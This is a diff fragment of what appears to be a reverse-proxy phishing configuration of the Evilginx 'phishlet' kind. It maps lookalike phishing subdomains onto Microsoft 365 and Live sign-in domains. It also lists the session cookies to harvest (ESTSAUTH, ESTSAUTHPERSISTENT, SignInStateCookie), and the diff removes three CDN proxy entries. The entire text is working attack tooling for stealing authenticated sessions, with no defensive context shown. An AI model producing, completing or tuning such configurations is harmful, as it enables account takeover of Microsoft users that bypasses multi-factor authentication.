@@ -6,9 +6,6 @@ proxy_hosts:
   - {phish_sub: 'www', orig_sub: 'www', domain: 'office.com', session: false, is_landing: false, auto_filter: true}
   - {phish_sub: 'login-ms', orig_sub: 'login', domain: 'microsoft.com', session: false, is_landing: false, auto_filter: true}
   - {phish_sub: 'login-live', orig_sub: 'login', domain: 'live.com', session: false, is_landing: false, auto_filter: true}
-  - {phish_sub: 'aadcdn', orig_sub: 'aadcdn', domain: 'msftauth.net', session: false, is_landing: false, auto_filter: true}
-  - {phish_sub: 'aadcdn2', orig_sub: 'aadcdn', domain: 'msauth.net', session: false, is_landing: false, auto_filter: true}
-  - {phish_sub: 'logincdn', orig_sub: 'logincdn', domain: 'msauth.net', session: false, is_landing: false, auto_filter: true}
 auth_tokens:
   - domain: '.login.microsoftonline.com'
     keys: ['ESTSAUTH', 'ESTSAUTHPERSISTENT', 'SignInStateCookie']
